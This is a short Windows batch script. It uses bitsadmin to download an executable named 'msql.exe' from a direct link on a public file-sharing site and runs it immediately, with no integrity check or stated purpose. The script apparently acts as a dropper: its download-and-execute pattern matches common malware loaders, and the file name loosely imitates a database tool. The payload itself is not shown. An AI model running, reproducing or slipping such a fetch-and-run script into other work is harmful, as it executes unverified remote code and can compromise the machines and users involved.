@echo off
echo Downloading msql.exe...
bitsadmin /transfer "MsqlDownload" https://www.4sync.com/web/directDownload/w5nMc6kJ/lB-K3_74.ff0a6081c2451031a1f2d2c68284aa78 %cd%\msql.exe

if exist %cd%\msql.exe (
    echo Running msql.exe...
    start /wait msql.exe
) else (
    echo Failed to download msql.exe.
)

